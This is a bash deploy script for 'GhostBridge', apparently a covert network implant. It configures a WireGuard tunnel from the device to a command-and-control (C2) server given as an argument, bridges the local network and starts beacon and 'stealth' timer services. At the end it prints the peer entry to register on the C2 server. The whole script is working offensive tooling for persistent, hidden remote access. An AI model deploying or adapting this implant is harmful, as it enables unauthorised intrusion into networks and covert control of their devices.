#!/bin/bash
#
# GhostBridge Quick Deploy Script
#
# One-command deployment with C2 configuration.
#
# Usage: ./deploy.sh <C2_ENDPOINT> <C2_PUBKEY> [API_ENDPOINT]
#
# Example:
#   ./deploy.sh "vpn.example.com:51820" "SERVER_PUBLIC_KEY" "http://10.66.66.1:8082/api/ghostbridge"
#

set -e

# Arguments
C2_ENDPOINT="$1"
C2_PUBKEY="$2"
API_ENDPOINT="${3:-http://10.66.66.1:8082/api/ghostbridge}"

# Configuration
CONFIG_DIR="/etc/ghostbridge"
WG_DIR="/etc/wireguard"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

log_info() { echo -e "${GREEN}[INFO]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }

# Validate arguments
if [ -z "$C2_ENDPOINT" ] || [ -z "$C2_PUBKEY" ]; then
    echo "GhostBridge Quick Deploy"
    echo ""
    echo "Usage: $0 <C2_ENDPOINT> <C2_PUBKEY> [API_ENDPOINT]"
    echo ""
    echo "Arguments:"
    echo "  C2_ENDPOINT   C2 server address (host:port)"
    echo "  C2_PUBKEY     C2 server WireGuard public key"
    echo "  API_ENDPOINT  MoMo API endpoint (optional)"
    echo ""
    echo "Example:"
    echo "  $0 vpn.example.com:51820 'abc123pubkey==' 'http://10.66.66.1:8082/api/ghostbridge'"
    exit 1
fi

# Check root
if [ "$EUID" -ne 0 ]; then
    log_error "Please run as root (sudo)"
    exit 1
fi

echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║              GhostBridge Quick Deploy                    ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════════════════╝${NC}"
echo ""

# Check if installed
if [ ! -f "$CONFIG_DIR/device_id" ]; then
    log_error "GhostBridge not installed. Run install.sh first."
    exit 1
fi

DEVICE_ID=$(cat "$CONFIG_DIR/device_id")
PRIVATE_KEY=$(cat "$CONFIG_DIR/wg_private.key")
PUBLIC_KEY=$(cat "$CONFIG_DIR/wg_public.key")

log_info "Device ID: $DEVICE_ID"
log_info "C2 Endpoint: $C2_ENDPOINT"

# Step 1: Update main config
log_info "Updating configuration..."

# Use Python to update YAML properly
python3 << EOF
import yaml
from pathlib import Path

config_path = Path("$CONFIG_DIR/config.yml")
config = yaml.safe_load(config_path.read_text())

config['tunnel']['endpoint'] = "$C2_ENDPOINT"
config['c2']['api_endpoint'] = "$API_ENDPOINT"

config_path.write_text(yaml.safe_dump(config, default_flow_style=False))
print("Configuration updated")
EOF

# Step 2: Create WireGuard config
log_info "Creating WireGuard configuration..."

mkdir -p "$WG_DIR"

cat > "$WG_DIR/wg0.conf" << EOF
[Interface]
PrivateKey = $PRIVATE_KEY
Address = 10.66.66.2/24

[Peer]
PublicKey = $C2_PUBKEY
Endpoint = $C2_ENDPOINT
AllowedIPs = 10.66.66.0/24
PersistentKeepalive = 25
EOF

chmod 600 "$WG_DIR/wg0.conf"
log_info "WireGuard config created"

# Step 3: Enable services
log_info "Enabling services..."

systemctl enable ghostbridge 2>/dev/null || true
systemctl enable ghostbridge-tunnel 2>/dev/null || true
systemctl enable ghostbridge-beacon 2>/dev/null || true
systemctl enable ghostbridge-stealth.timer 2>/dev/null || true

# Step 4: Start services
log_info "Starting services..."

systemctl start ghostbridge
sleep 2
systemctl start ghostbridge-tunnel
sleep 3
systemctl start ghostbridge-beacon

# Step 5: Verify
log_info "Verifying deployment..."

sleep 5

# Check tunnel
if wg show wg0 &>/dev/null; then
    HANDSHAKE=$(wg show wg0 latest-handshakes | awk '{print $2}')
    if [ -n "$HANDSHAKE" ] && [ "$HANDSHAKE" != "0" ]; then
        log_info "✓ Tunnel connected with handshake"
    else
        echo -e "${YELLOW}⚠ Tunnel up but no handshake yet${NC}"
    fi
else
    echo -e "${RED}✗ Tunnel not running${NC}"
fi

# Check bridge
if ip link show br0 &>/dev/null; then
    log_info "✓ Bridge active"
else
    echo -e "${YELLOW}⚠ Bridge not active${NC}"
fi

# Check beacon
if systemctl is-active --quiet ghostbridge-beacon; then
    log_info "✓ Beacon service running"
else
    echo -e "${YELLOW}⚠ Beacon service not running${NC}"
fi

echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║              Deployment Complete!                        ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "Device ID:  ${BLUE}$DEVICE_ID${NC}"
echo -e "Public Key: ${BLUE}$PUBLIC_KEY${NC}"
echo ""
echo -e "${YELLOW}Add this peer to your C2 server:${NC}"
echo ""
echo "[Peer]"
echo "# $DEVICE_ID"
echo "PublicKey = $PUBLIC_KEY"
echo "AllowedIPs = 10.66.66.2/32"
echo ""
log_info "Device is ready for deployment!"

